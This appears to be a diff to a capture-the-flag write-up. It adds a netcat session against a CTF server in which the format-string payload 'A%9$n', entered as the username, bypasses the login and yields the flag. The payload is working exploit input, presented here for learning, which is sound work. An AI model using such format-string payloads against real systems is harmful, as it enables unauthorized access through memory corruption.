@@ -217,7 +217,13 @@ flag.txt: No such file or directory
 ```
 This worked - now to run it against the server:
 ```
+nc ctf.hackucf.org 7006
+user = 0x1b29010
+Enter your username:
+A%9$n
+Enter password for user: A
 
+Successfully logged in!
 ```
 
 This gave me the flag!
